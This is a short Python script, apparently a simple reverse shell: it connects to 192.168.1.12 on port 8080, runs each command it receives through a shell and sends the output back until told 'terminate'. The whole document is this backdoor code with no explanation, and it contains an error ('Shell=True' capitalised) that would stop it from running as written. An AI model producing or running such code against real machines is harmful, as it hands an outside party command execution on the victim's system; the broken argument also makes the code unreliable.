import socket

import subprocess

def connect():
     s= socket.socket()
     s.connect(("192.168.1.12",8080))
     
     while True:
         command = s.recv(1024)
         if 'terminate' in command.decode():
            s.close()
            break
         else:
             CMD = subprocess.Popen(command.decode(), Shell=True, stdout=subprocess.PIPE,stderr = subprocess.PIPE)
             s.send(CMD.stdout.read())
             s.send(CMD.stderr.read())
def main():
    connect()
main()     
